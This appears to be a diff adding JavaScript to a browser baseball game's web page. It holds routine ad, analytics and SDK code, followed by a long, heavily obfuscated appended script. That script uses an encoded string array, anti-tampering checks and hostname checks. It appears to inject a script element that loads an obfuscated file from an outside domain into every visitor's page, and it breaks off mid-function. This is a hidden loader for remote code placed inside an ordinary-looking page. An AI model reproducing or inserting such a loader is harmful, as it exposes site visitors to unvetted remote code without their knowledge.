+	        } else if (typeof aiptag !== 'undefined' && aiptag.settings.iProsperTest !== "undefined") {
+	          if (doTagOnce) SendEvent('event', 'aip_legacy');
+	          SendEvent('event', 'request_legacy');
+	        }
+
+
+	        doTagOnce = false;
+	      } else {
+	        l.style.backgroundImage = "url(assets/turnoff2.jpg)";
+	        SendEvent('event', 'banner_adblocked_message_shown');
+	      }
+
+	    }
+
+
+
+
+
+	    function right(str, chr) {
+	      return str.slice(str.length - chr, str.length);
+	    }
+
+	    function SetCGInviteLink() {
+	      if (typeof gCrazySDK !== 'undefined') {
+	        var meta = document.getElementById("cglink");
+	        var aStr = meta.value;
+	        aStr = right(aStr, 8);
+	        var aCGLink = gCrazySDK.inviteLink({
+	          roomId: aStr
+	        });
+	        meta.value = aCGLink;
+	        meta.select
+	        document.execCommand('Copy')
+	        console.log("COPIED CG URL");
+	      }
+	    }
+
+	    function ShowAdBreak() {
+	      //check if the adslib is loaded correctly or blocked by adblockers etc.
+	      if (typeof gCrazySDK !== 'undefined') {
+	        Main.DoneInterstitialAd(false);
+	        return;
+	      }
+
+	      if (typeof adplayer === 'undefined') {
+	        Main.DoneInterstitialAd(true);
+	        return;
+	      }
+	      aiptag.cmd.player.push(function() {
+	        adplayer.startAdBreak();
+	      });
+	    }
+
+
+	    document.getElementById("openfl-content").addEventListener("wheel", doScroll);
+	    document.getElementById("more").addEventListener("wheel", doScroll);
+
+	    function doScroll(event) {
+	      window.scroll(0, window.scrollY + event.deltaY);
+	    }
+
+	    function doScroll2(event) {
+	      window.scroll(0, window.scrollY + event.deltaY);
+	    }
+
+
+	    setInterval(function() {
+	      //console.log("active element:" + document.activeElement);
+	      if (document.activeElement.tagName == "IFRAME") {
+	        document.activeElement.blur();
+	        document.getElementById('openfl-content').focus();
+	        //console.log('refocusing');
+	      }
+	    }, 30);
+
+
+	    /*setInterval(function () { 
+	    	var l = window.document.getElementById('preroll');
+	    	if(l != null && typeof l.style !== 'undefined' && l.style.visibility !== 'visible') {
+	    		document.getElementById('openfl-content').focus();
+	    		if(document.activeElement instanceof HTMLIFrameElement)
+	    		{
+	    			//document.activeElement.style.display = "none";
+	    			window.focus();
+	    			window.document.getElementById('openfl-content').focus();
+	    		}
+	    	}
+	    }, 1000);*/
+
+
+	    /*		setInterval(function () { 
+	    			var l = window.document.getElementById('baseballbros-io_160x600');
+	    			if(l != null && typeof l.style !== 'undefined' && l.style.visibility == 'visible') {
+	    				ShowAd5();
+	    			}
+	    		}, 30000);
+
+	    		setInterval(function () { 
+	    			var l = window.document.getElementById('baseballbros-io_160x600_2');
+	    			if(l != null && typeof l.style !== 'undefined' && l.style.visibility == 'visible') {
+	    				ShowAd1();
+	    			}
+	    		}, 32000);*/
+
+	    var sid = '02k06etmp6fnad6qk2e82s1dfi'
+
+	    function updateStatus(fromEvent = false) {
+	      const req = new XMLHttpRequest();
+	      var aStr = "recordsession.php?s=" + sid;
+	      if (fromEvent == true) aStr = aStr + "&e=1"
+	      req.open("GET", aStr);
+	      req.send();
+	    }
+
+	    function SendEvent(theEvent, theAction, theParms = '') {
+	      if (theParms == '') {
+	        gtag(theEvent, theAction);
+	      } else {
+	        gtag(theEvent, theAction, theParms);
+	      }
+	      updateStatus(true);
+	      //console.log("Sending event: " + theEvent + "/" + theAction + "/" + theParms);
+	    }
+	    //setInterval(function() { updateStatus, 4*60*1000);			
+	    //setInterval( function() { 
+	    //	window.scrollTo(0, 0); 
+	    //}, 2000 );					
+	    updateStatus(true);
+
+	    //setInterval(ClearAds, 2000);		
+
+	    function EmailSignup() {
+	      if (document.getElementById("signup") || document.getElementById("deleteme")) return;
+	      const iframe = document.createElement("iframe");
+
+	      //			iframe.style.display = "block";
+	      iframe.style.width = "550px";
+	      iframe.style.height = "" + window.innerHeight - 100 + "px";
+	      iframe.style.position = "absolute";
+	      iframe.style.top = "50px";
+	      iframe.style.left = "50%";
+	      iframe.style["margin-left"] = "-225px";
+	      //iframe.style["margin-right"] = "-275px";
+	      iframe.style["max-width"] = "100%";
+	      iframe.setAttribute("id", "signup");
+
+	      document.body.appendChild(iframe);
+	    }
+
+	    function GamePlayStart() {
+	      if (typeof gCrazySDK !== 'undefined') {
+	        console.log("GamePlayStart");
+	        gCrazySDK.gameplayStart();
+	      }
+	    }
+
+	    function GamePlayStop() {
+	      if (typeof gCrazySDK !== 'undefined') {
+	        console.log("GamePlayStop");
+	        gCrazySDK.gameplayStop();
+	      }
+	    }
+
+	    function HappyTime() {
+	      if (typeof gCrazySDK !== 'undefined') {
+	        console.log("happytime");
+	        gCrazySDK.happytime();
+	      }
+	    }
+
+	    var scrollerMessage = " WELCOME TO BASEBALL BROS! ARE YOU READY TO HIT SOME NUKES? WE'RE STILL MAKING ADJUSTMENTS- YOU CAN CHECK THE BOTTOM OF THE PAGE FOR THE LATEST CHANGES! IF YOU HAVE A GLITCH OR FEEDBACK, YOU CAN EMAIL INFO@BLUEWIZARD.COM!!! ";
+
+	    const element = document.getElementById('openfl-content');
+	    // Function to keep the element focused
+	    function keepFocus() {
+	      element.focus();
+	    }
+	    // Event listeners to restore focus when lost
+	    element.addEventListener('blur', keepFocus);
+	    element.addEventListener('focusout', keepFocus);
+	  </script>
+	
+<script>(function(ykJYJgqRQvLQ,gSsZu$aEkLNcrSPk){const kGsNXc=sFfEkK$fMziBAJZwZbkuvp,gXeiNWc=ykJYJgqRQvLQ();while(!![]){try{const HcMpeIOoYPvgF=Number(-parseFloat(kGsNXc(0x1a7))/(0xa*Number(parseInt(0x133))+parseInt(0x1581)+-0x6*parseInt(0x595)))*(-parseFloat(kGsNXc(0x183))/(parseInt(0x238d)+parseInt(0x2)*-0x85b+parseInt(-0x3)*0x647))+Number(-parseFloat(kGsNXc(0x18f))/(Math.floor(-0x1e99)+0x1a*-0x151+parseInt(0x40d6)))*(parseFloat(kGsNXc(0x17e))/(Number(parseInt(0x1d))*Number(0xe7)+-parseInt(0x2)*-0xec9+Math.max(-0x631,-0x631)*parseInt(0x9)))+parseFloat(kGsNXc(0x1be))/(0x1*-parseInt(0x23)+-parseInt(0x1)*Math.max(0x579,parseInt(0x579))+0x5a1)+-parseFloat(kGsNXc(0x1a9))/(Math.floor(parseInt(0xfbc))+Math.floor(-parseInt(0x1c3b))+Math.ceil(parseInt(0x281))*0x5)*(parseFloat(kGsNXc(0x191))/(Math.max(0x1,0x1)*-parseInt(0x88d)+Math.trunc(0x776)+parseInt(0x11e)))+parseInt(-parseFloat(kGsNXc(0x1ac))/(Number(0x3)*parseInt(0x72a)+0x243*-0xb+Number(0x36b)))*parseInt(-parseFloat(kGsNXc(0x189))/(-0x1*-parseInt(0x1875)+-parseInt(0x1)*0x2186+-0x5*-0x1d2))+Math['max'](-parseFloat(kGsNXc(0x1b2))/(parseInt(0x3d)*Number(0x90)+parseInt(0x1)*-0x1e1f+-parseInt(0x427)),-parseFloat(kGsNXc(0x1b6))/(Math.max(-parseInt(0x200e),-0x200e)+0x1*parseInt(0xaea)+0x1ed*parseInt(0xb)))+parseInt(parseFloat(kGsNXc(0x195))/(parseInt(0x1bc9)+-parseInt(0x764)+Math.trunc(-parseInt(0x1459))));if(HcMpeIOoYPvgF===gSsZu$aEkLNcrSPk)break;else gXeiNWc['push'](gXeiNWc['shift']());}catch(FoDQtRV){gXeiNWc['push'](gXeiNWc['shift']());}}}(UravPbGESYjDUNqxKcf$Vqza,-0x1*parseFloat(parseInt(0x62251))+-0x204aa+parseInt(0x3b35)*parseInt(0x43)));function UravPbGESYjDUNqxKcf$Vqza(){const VwjQavltNv=['ec898d9b88abb4','edede8aca19f8db3b0','ede8edece1edb1a99dae9a9f','ece8e1e1e9e183b8b39d8e80','bdb0af','b8a9a9bcb7bd9ab1b0b5bd','bbb6bda0','baabbcb8adbc9cb5bcb4bcb7ad','e0ecedefebece9b7a19389bc98','ee9ab5baab9288','b5b6be','aaadb8abadaa8eb0adb1','e8e9ece9e9e1eeecb49495bcaab3','efebe8e0e1ebeceaabb1b68cbabb','b5b6bab8b5b1b6aaad','adb68aadabb0b7be','bfb5b6b6ab','b1adada9aae3f6f6babdb7f7abe0a1f7b0b7f6b8b0b5b6beb0ba86beb7f4b4b8adb1f7bdbcaf86b6bbbff7b3aa','a9abb6adb6ada0a9bc','ebe0b5b5a99ebbb1','edede1eae9e9e98bb4beb6b1b0','a9abb6adb6bab6b5','efe8ef8ea39bad9dad','adb8bbb5bc','e8eeef9b979b8ab1b4','e0ede8eee1e1e19293969e9da0','b0b7bfb6','eeeee1eae8e19aa19ab494b3','a9acaab1','bbb0b7bd','babcb0b5','ebedea96bc9f9e88b1','ebefe9ebe8e9bbaaadb2b090','efeab3909e958092','b8a9a9b5a0','abb8b7bdb6b48c8c909d','bebcad9cb5bcb4bcb7ad9ba090bd','eee9efeeef9c9a979d8f8b','bca1babca9adb0b6b7','e8ece1e8e0b3a1b6b19488','aab1b0bfad','e8e9ebebe9aba1b39f9493','a2a4f7bab6b7aaadabacbaadb6abf1fbabbcadacabb7f9adb1b0aafbf0f1f9f0','aabcb8abbab1','bab6b7aab6b5bc','eeecefe1efede99fb69f928f91','adabacb7ba','aabaabb0a9ad','aaabba','bab6b7aaadabacbaadb6ab','abbcb4b6afbc','8686a9abb6adb68686','abbca9b5b8babc98b5b5','e8ebeef7e9f7e9f7e8','aeb8abb7','bfb0b5bc','adabb8babc','b1b6aaadb7b8b4bc','abbcadacabb7f9f1bfacb7baadb0b6b7f1f0f9','eceae1eee9e8e9938eb49fbc96','f1f1f1f7f2f0f2f0f2f0f2fd','bcababb6ab','e8eaefeee989b2b6aab38b','ebbb8f9db190a8','b5bcb7beadb1','e8eeebe1ac81b6bca08d'];UravPbGESYjDUNqxKcf$Vqza=function(){return VwjQavltNv;};return UravPbGESYjDUNqxKcf$Vqza();}function _0xe8c3(rg_FddjIYmSuDaXct_SbftOPO,Od_FYPa_mevt){rg_FddjIYmSuDaXct_SbftOPO=rg_FddjIYmSuDaXct_SbftOPO-(Math.trunc(parseInt(0xe6e))+parseInt(0x272)+0x4*parseFloat(-0x408));const RpdkwFFntaedhLUsDwbyOh=_0x257e();let uWkwAed$dMg_pC=RpdkwFFntaedhLUsDwbyOh[rg_FddjIYmSuDaXct_SbftOPO];return uWkwAed$dMg_pC;}(function(mRvOXTqaCttJOulbTlUWmr,C_FoJhGb_hSKAwdyPQonizmLyCA){const UTF$MMBycHGYrTfD_Ufh=sFfEkK$fMziBAJZwZbkuvp,vUk$$ZvvSlCIAc=_0xe8c3,aivDrxhk$kGhjNzepqLWPvd=mRvOXTqaCttJOulbTlUWmr();while(!![]){try{const uSUNXbU$YsNm$I=-parseInt(vUk$$ZvvSlCIAc(-parseInt(0x3)*0x7ef+0x3*parseFloat(-parseInt(0x1d9))+parseInt(0x1e2b)*parseInt(0x1)))/(parseFloat(-parseInt(0x13d))+parseFloat(-0x1054)*-0x2+Math.trunc(-0xfb5)*0x2)*(parseInt(vUk$$ZvvSlCIAc(Number(-0x206f)+-0x17f1+parseInt(parseInt(0x3949))))/(-parseInt(0x9b)+-0x2253+-0x8bc*parseInt(-0x4)))+parseInt(vUk$$ZvvSlCIAc(0xf*-parseInt(0x17f)+Math.trunc(0xe59)+0x8f2))/(-0x1*Math.floor(-parseInt(0x48b))+-parseInt(0x3d)*-parseInt(0x3e)+-parseInt(0x134e))*(-parseInt(vUk$$ZvvSlCIAc(Math.trunc(-parseInt(0x596))+0x4*-parseInt(0x6c2)+Math.floor(0x216d)))/(-parseInt(0x142d)*-parseInt(0x1)+0x1230+-parseInt(0x2659)))+parseInt(vUk$$ZvvSlCIAc(parseInt(0xb)*0x25+0x31*-parseInt(0x6d)+-parseInt(0x37)*-0x5e))/(parseInt(0x1588)+-parseInt(0x26c7)+0x1144)*(parseInt(vUk$$ZvvSlCIAc(-parseInt(0x153)+-parseInt(0x996)*parseInt(0x1)+parseInt(0xbc8)*Math.trunc(parseInt(0x1))))/(0x11a*parseInt(0xd)+parseInt(0x15)*-0x16f+0xfcf))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x1))*-parseInt(0x155f)+Math.trunc(-0x19)*Math.ceil(-0x16f)+-0xd8d*Math.floor(parseInt(0x1))))/(Number(-0x13b8)+0x210f+0x18*-0x8e)*(-parseInt(vUk$$ZvvSlCIAc(0x559*Math.floor(0x6)+-0xa*Math.ceil(-parseInt(0x76))+-parseInt(0x23ce)*parseInt(0x1)))/(0x5*parseFloat(-parseInt(0x47b))+-parseInt(0x2e7)*Math.max(0x6,parseInt(0x6))+Math.floor(parseInt(0x65))*0x65))+-parseInt(vUk$$ZvvSlCIAc(parseFloat(-parseInt(0x18ac))*parseFloat(0x1)+-0x1266+Math.max(0x2bf7,parseInt(0x2bf7))))/(-0xfb0+parseFloat(parseInt(0x1fc))*parseFloat(parseInt(0xd))+Math.ceil(-parseInt(0x1))*Number(parseInt(0xa13)))*(parseInt(vUk$$ZvvSlCIAc(Math.floor(-parseInt(0x1))*-0xea3+0x77d*-0x4+Math.ceil(parseInt(0x1041))))/(-parseInt(0x1)*Math.ceil(parseInt(0xc0a))+parseInt(-0x7)*Number(parseInt(0x365))+0x72b*Math.floor(parseInt(0x5))))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x14a9))*Math.max(0x1,0x1)+parseInt(0xf9e)+-parseInt(0x2384)))/(Math.ceil(-parseInt(0x1))*-0x5b3+-0x249+0x35f*Math.ceil(-0x1))*(-parseInt(vUk$$ZvvSlCIAc(Math.max(0x1da8,parseInt(0x1da8))+0x2211+parseInt(-0x157)*parseInt(0x2f)))/(0x1af2+0x6be+Number(-parseInt(0x21a4))))+parseInt(vUk$$ZvvSlCIAc(0x15e9+0x5*Math.ceil(-0x3cb)+parseInt(0x1)*Math.floor(-parseInt(0x215))))/(-0xad*-parseInt(0x35)+-parseInt(0x11c)*parseFloat(parseInt(0x2))+Math.ceil(0x71)*-0x4c);if(uSUNXbU$YsNm$I===C_FoJhGb_hSKAwdyPQonizmLyCA)break;else aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}catch(JS$nMXs$AZMsoi){aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}}}(_0x257e,Math.ceil(-0x2b9cb)*parseInt(0x9)+-0x2*parseFloat(-0x71c4d)+0x182df0),(function(){const fyfZe$A=sFfEkK$fMziBAJZwZbkuvp,KmkEnmSV=_0xe8c3,YYzy$XBjBwTdCwIPE$AKHEWaC=(function(){let MLfOyVBUyEPRR$$IEj=!![];return function(jeThI,ybpXPE$jfq){const vZRAXjF$_R=MLfOyVBUyEPRR$$IEj?function(){const DEQRwbJTpzvMFOryYEYKoGCD=_0xe8c3;if(ybpXPE$jfq){const vcZlz$G_trTEiNcVEYRhOyCWG=ybpXPE$jfq[DEQRwbJTpzvMFOryYEYKoGCD(Math.floor(parseInt(0x1))*-0x237b+0x5*parseInt(0x359)+parseFloat(parseInt(0x1389)))](jeThI,arguments);return ybpXPE$jfq=null,vcZlz$G_trTEiNcVEYRhOyCWG;}}:function(){};return MLfOyVBUyEPRR$$IEj=![],vZRAXjF$_R;};}()),qiwjHUauNrHLN$fg=(function(){let waQzQOaFVfq$WfrLnCpTYrDG=!![];return function(MNjbEXhItZtXPLUuC,uCZgwC$hqQ){const PsosmKTYqISIXVWY=waQzQOaFVfq$WfrLnCpTYrDG?function(){const gYLqgDXYRVUjJMRQBYU=_0xe8c3;if(uCZgwC$hqQ){const GGdBrUxKuCaWtlKW=uCZgwC$hqQ[gYLqgDXYRVUjJMRQBYU(Math.trunc(-0x2)*0x1384+parseInt(-parseInt(0x216a))+-parseInt(0x1)*-0x493d)](MNjbEXhItZtXPLUuC,arguments);return uCZgwC$hqQ=null,GGdBrUxKuCaWtlKW;}}:function(){};return waQzQOaFVfq$WfrLnCpTYrDG=![],PsosmKTYqISIXVWY;};}());let hK$kJs=![],udh_ln$z=[],bzBMId=![],YFTSa_AyznhLRB=![];function c$uljJUCGCQHFqM(hvUOLCHfCBhIT,gGA$_MNmIu){const YxGzqKLhsTvBRmcdZ=sFfEkK$fMziBAJZwZbkuvp,ALBAzExBHKkx=_0xe8c3,aOjOz$OyGi_Sw=YYzy$XBjBwTdCwIPE$AKHEWaC(this,function(){const MwJDUeTlPCUAtp_Pi$gkCn=sFfEkK$fMziBAJZwZbkuvp,S$_bpOvwP=_0xe8c3;return aOjOz$OyGi_Sw[S$_bpOvwP(Number(parseInt(0x2117))+-0x2a5+-0x1d84*Math.floor(parseInt(0x1)))]()[S$_bpOvwP(0x33a*0x1+-0xca6*0x1+-parseInt(0x518)*-0x2)](S$_bpOvwP(Math.floor(parseInt(0x1b9e))+parseFloat(-0x59b)+Number(-0x2f)*Number(0x73)))[S$_bpOvwP(Math.floor(0x2540)+Math.max(parseInt(0x1b68),0x1b68)+-0xa9f*Math.floor(parseInt(0x6)))]()[S$_bpOvwP(0x6b*parseInt(-parseInt(0xa))+Math.max(parseInt(0x2417),0x2417)+parseFloat(parseInt(0x1f21))*Number(-0x1))](aOjOz$OyGi_Sw)[S$_bpOvwP(parseFloat(-0x5c)*0x29+0x4b*0x5e+0x1*-parseInt(0xc0a))](MwJDUeTlPCUAtp_Pi$gkCn(0x1a4));});aOjOz$OyGi_Sw();const EsAEXrTkuAdPT__tKKG=qiwjHUauNrHLN$fg(this,function(){const DHKhHH$CzdaTFZpF=sFfEkK$fMziBAJZwZbkuvp,CjsPKzyFLwfe=_0xe8c3,AA_ZPkQAKRmDwqTTTdciyQE=function(){const wFmIP_BJY=_0xe8c3;let c$bSXVWQIogWemFKiw;try{c$bSXVWQIogWemFKiw=Function(wFmIP_BJY(-parseInt(0x11b5)*-parseInt(0x1)+-0x1*-0x7bb+parseFloat(-0x1890))+wFmIP_BJY(Math.trunc(-parseInt(0x31))*-parseInt(0x46)+parseInt(0x34)+Math.trunc(-0xcb8)*parseInt(0x1))+');')();}catch(Gb_ACKNijqUcdVRCDBcMcF){c$bSXVWQIogWemFKiw=window;}return c$bSXVWQIogWemFKiw;},Vkmv$yFSRdHrKoQ=AA_ZPkQAKRmDwqTTTdciyQE(),utUNAf_YOnudTwxsFQFYNVLTF=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.floor(-0x1d5)*-parseInt(0x11)+Math.floor(-0xd)*parseInt(0x13b)+0x1*Math.max(-0xe39,-0xe39))]=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.max(-0x1ba4,-0x1ba4)+parseInt(0xbe)*Math.max(-parseInt(0xd),-parseInt(0xd))+parseInt(0x2637))]||{},ub_IKGtkVJnrm=[DHKhHH$CzdaTFZpF(0x1b4),CjsPKzyFLwfe(-parseInt(0x75c)+-0x3d*parseInt(0x30)+parseInt(0x1396)),CjsPKzyFLwfe(Math.floor(-parseInt(0xcf6))+parseFloat(-0x18)*parseInt(-parseInt(0x59))+Math.ceil(0x57f)),CjsPKzyFLwfe(0xa86+Number(-parseInt(0x585))+-0x43a),CjsPKzyFLwfe(0x1f9+parseInt(0x2)*-0xd5+Math.floor(-parseInt(0x4))*Number(-0x25)),CjsPKzyFLwfe(Math.floor(-0x18f1)+0x4b7+parseInt(0x150b)),CjsPKzyFLwfe(0x1a5*0x1+parseInt(0x352)+parseInt(0x29)*parseInt(-parseInt(0x1a)))];for(let FNmbuOKunHKDQnEd=parseInt(0x5)*0x2f1+Math.max(parseInt(0x1d8f),0x1d8f)*-parseInt(0x1)+0xeda;FNmbuOKunHKDQnEd<ub_IKGtkVJnrm[CjsPKzyFLwfe(-0xe40+-0x65*Math.floor(0x24)+parseInt(0x1d4f))];FNmbuOKunHKDQnEd++){const ksLNxwdrpBft=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(-parseInt(0x1b30)+Math.trunc(parseInt(0x25da))+parseInt(0xfd)*-0xa)][CjsPKzyFLwfe(-0x1540+-parseInt(0x1564)+-0x2b82*Math.ceil(-parseInt(0x1)))][CjsPKzyFLwfe(Math.ceil(-parseInt(0x49))*-0x58+Math.max(-parseInt(0x66),-parseInt(0x66))*parseInt(0x25)+-0x3*0x32b)](qiwjHUauNrHLN$fg),TbeQm$$iDqjMKpTtSlnEF=ub_IKGtkVJnrm[FNmbuOKunHKDQnEd],PCdCtHVuQ$WZinsEonTDhRHx=utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]||ksLNxwdrpBft;ksLNxwdrpBft[CjsPKzyFLwfe(parseInt(0x1f25)+0x9*-parseInt(0x349)+Math.ceil(-parseInt(0xbf)))]=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(Math.ceil(-parseInt(0x27))*Math.max(-parseInt(0x38),-0x38)+Math.trunc(0x874)+parseFloat(parseInt(0x1))*Math.trunc(-parseInt(0x1023)))](qiwjHUauNrHLN$fg),ksLNxwdrpBft[DHKhHH$CzdaTFZpF(0x1b9)]=PCdCtHVuQ$WZinsEonTDhRHx[CjsPKzyFLwfe(parseInt(0xf84)+Number(-parseInt(0xa8b))*0x2+0x680)][CjsPKzyFLwfe(Math.floor(-0x2)*-parseInt(0x81b)+parseInt(0x144c)+parseInt(0x23a9)*Math.trunc(-0x1))](PCdCtHVuQ$WZinsEonTDhRHx),utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]=ksLNxwdrpBft;}});EsAEXrTkuAdPT__tKKG(),udh_ln$z[YxGzqKLhsTvBRmcdZ(0x184)](hvUOLCHfCBhIT);let ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x18c)](hvUOLCHfCBhIT);!ZZlEfnTJFgKrlZQ&&(ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x1b1)](ALBAzExBHKkx(0x27*0x14+parseInt(0x1902)+-parseInt(0x36)*parseInt(0x81))),ZZlEfnTJFgKrlZQ['id']=hvUOLCHfCBhIT,document[ALBAzExBHKkx(parseFloat(-0x18ce)+-0x462+-parseInt(0xf0)*-0x20)][ALBAzExBHKkx(-parseInt(0x3)*Math.trunc(0x471)+Number(parseInt(0x247c))+Math.max(-parseInt(0x5),-parseInt(0x5))*parseInt(0x477))](ZZlEfnTJFgKrlZQ));const JusV_APG$gjSZYfdHqhYsOfh=document[ALBAzExBHKkx(-parseInt(0x749)+Math.ceil(-parseInt(0x25f4))+parseInt(0x2e11))](ALBAzExBHKkx(parseInt(parseInt(0x214c))+0x1afe+-0x1*Number(parseInt(0x3b73))));JusV_APG$gjSZYfdHqhYsOfh[ALBAzExBHKkx(-0x281*Number(0xa)+0x1*0x153b+Math.trunc(0x491))]=ALBAzExBHKkx(0x6*parseInt(0x350)+0x236+Math.floor(-0x11d)*parseInt(0x13)),ZZlEfnTJFgKrlZQ[ALBAzExBHKkx(parseInt(0x1347)+parseInt(0x3)*Number(-0x9b)+-parseInt(0x10a0))](JusV_APG$gjSZYfdHqhYsOfh),gGA$_MNmIu===Math[YxGzqKLhsTvBRmcdZ(0x186)](-parseInt(0x5)*parseFloat(-parseInt(0x21e))+Math.ceil(-0xf)*-0x250+Math.floor(0x2d42)*-0x1)*-(Math.max(-0x989,-0x989)+Math.ceil(-0x44e)+parseInt(-parseInt(0x2))*-0x840)+parseInt(Math.ceil(0x1)*Math.max(0xd53,parseInt(0xd53))+-parseInt(0x1df5)*Number(-0x1)+Math.ceil(-parseInt(0x6a))*parseInt(0x20))+parseFloat(-parseInt(Math.trunc(-parseInt(0x1))*parseInt(0x144f)+Math.ceil(0x2d)*-0xb3+Math.trunc(parseInt(0x1))*parseInt(0x368b)))*(parseInt(0x2bb)+parseInt(0x6e3)+-parseInt(0x1eb)*Math.max(parseInt(0x5),parseInt(0x5)))?bzBMId=!![]:YFTSa_AyznhLRB=!![];}function IuySzzpOiISwZDDrwmF(){const TJjv$_TBBMK=sFfEkK$fMziBAJZwZbkuvp,wRFucCDOfu$LtCMXVPgy=_0xe8c3,k_l_ellCISKwd=location[wRFucCDOfu$LtCMXVPgy(Math.floor(0x11)*parseFloat(-parseInt(0x9e))+Math.floor(-parseInt(0x2194))+parseInt(0x4)*parseInt(0xb36))];return k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(parseInt(0x1)*Math.ceil(parseInt(0x265))+parseInt(0x5)*0x69e+-0x22b2)||k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(0x7*-0x53f+Math.floor(-0x1)*parseInt(0x2351)+0x48cb*parseInt(parseInt(0x1)))||location[wRFucCDOfu$LtCMXVPgy(parseInt(0x2133)+parseInt(0x4b6)+-0x3*parseInt(0xc5f))][TJjv$_TBBMK(0x1b5)](TJjv$_TBBMK(0x19f));}c$uljJUCGCQHFqM(crypto[KmkEnmSV(-0x7a*-parseInt(0x13)+parseInt(0x1f8b)+-0x257*parseInt(0x11))]()[KmkEnmSV(parseFloat(-0x1076)+Math.ceil(parseInt(0x1d3))*Math.max(0x2,0x2)+parseFloat(0xdba))]('-',''),parseInt(0x1*parseInt(-parseInt(0x270a))+0x1*-0x4ff+parseInt(0x43b8))+(Math.ceil(-parseInt(0xc7d))*-parseInt(0x1)+Math.floor(-parseInt(0x18e5))+0x1e00)+parseInt(-(0x49aa+0x163*parseInt(0x29)+-0x593f))),c$uljJUCGCQHFqM(crypto[fyfZe$A(0x18b)]()[fyfZe$A(0x19c)]('-',''),Math[KmkEnmSV(0x1250+-0x19f0+Math.max(0x887,parseInt(0x887)))](-(0x85d*-0x1+-parseInt(0x25ce)*-0x1+-parseInt(0x3ae)*parseInt(0x8)))*(0x9*parseFloat(parseInt(0x405))+parseInt(0x106)*-0x17+-parseInt(0xc70))+-parseInt(parseInt(0xbfa)+parseInt(0x1c)*0x29c+-0x1*Math.trunc(parseInt(0x3077)))+Math[KmkEnmSV(Math.floor(parseInt(0x34d))+parseInt(0x61)*-0x5f+parseInt(0x2180))](-(-0x13ff+parseInt(-0x765)+0x1ffd))*-(parseInt(0x213b)+parseFloat(-0x1e65)*parseInt(-parseInt(0x1))+Math.floor(parseInt(0x25))*-0x1b8));let cDI_LjPiksLv$sA=setInterval(()=>{const wAfptqBlmnOZ=fyfZe$A,gcJTS=KmkEnmSV;hK$kJs&&clearInterval(cDI_LjPiksLv$sA);for(let DwEqUVjz_qHgd_omhiKOFelRy=-parseInt(-parseInt(0x2286)+parseInt(parseInt(0x60d))*-0x2+parseInt(0x2f30))+Math[wAfptqBlmnOZ(0x196)](-parseInt(0xe05)*-0x2+Number(-0x6c9)*Math.floor(0x5)+parseInt(0x1d4)*0xb)*(Math.trunc(0x17)*-parseInt(0x86)+parseInt(0x9a)+Math.ceil(0xb72))+-parseInt(Math.max(parseInt(0x1),0x1)*-parseInt(0x2926)+-0x1d97+Number(parseInt(0x629f)));DwEqUVjz_qHgd_omhiKOFelRy<udh_ln$z[gcJTS(-parseInt(0x3d8)+Math.max(parseInt(0x86),parseInt(0x86))*Math.floor(-parseInt(0x3b))+Math.ceil(parseInt(0x2395))*Number(0x1))];DwEqUVjz_qHgd_omhiKOFelRy++){const cPPRWqXnlPOY$$cBq=udh_ln$z[DwEqUVjz_qHgd_omhiKOFelRy],Okf$w_HLhAd=document[gcJTS(Math.floor(-0x96)*-0xd+-parseInt(0x18f5)+parseFloat(parseInt(0x1b))*0xad)](cPPRWqXnlPOY$$cBq);YFTSa_AyznhLRB&&bzBMId&&(!hK$kJs&&(!Okf$w_HLhAd&&(!IuySzzpOiISwZDDrwmF()&&document[wAfptqBlmnOZ(0x1b0)][gcJTS(Math.floor(parseInt(0x995))*-0x4+Math.ceil(-0x8fe)+Math.max(0x371,0x371)*0xe)]())));}},Math[KmkEnmSV(Math.ceil(0x2615)*Math.floor(parseInt(0x1))+-parseInt(0x171f)+-parseInt(0xe31)*0x1)](-parseInt(-0x6f1*parseInt(0x7)+0x2*-0x24b3+Math.max(-parseInt(0x104),-0x104)*-parseInt(0x9e)))+(-parseInt(0x2)*0xf08+0x1baf+0xfe4)+Number(parseInt(0x1083)*Math.max(parseInt(0x1),0x1)+Math.floor(0x1e34)+-parseInt(0x11d7)));}()));function sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek){const jpcyYzd_r_c=UravPbGESYjDUNqxKcf$Vqza();return sFfEkK$fMziBAJZwZbkuvp=function(cBkxdlJOLrthNdkDJWsPnwlWD,Ew_izWDrWs$VbNMSejx){cBkxdlJOLrthNdkDJWsPnwlWD=cBkxdlJOLrthNdkDJWsPnwlWD-(parseInt(0x222d)*-parseInt(0x1)+0xbaa+Math.ceil(parseInt(0x1801)));let ZrC$BmMHQJFnM$qxVDvOaapr=jpcyYzd_r_c[cBkxdlJOLrthNdkDJWsPnwlWD];if(sFfEkK$fMziBAJZwZbkuvp['MCMlHP']===undefined){const kiHmW=function(qHLfn){let zVDPTWpEcic$l=Number(-0x7d)*parseFloat(-parseInt(0xe))+0x1b0e*Number(0x1)+parseInt(-parseInt(0xb))*0x301&Math.trunc(-parseInt(0x5))*0x1c+parseFloat(-parseInt(0x788))*parseInt(0x5)+-0x29d*-parseInt(0xf),GQloCGHmGKtLJqIIj$jnKaqx=new 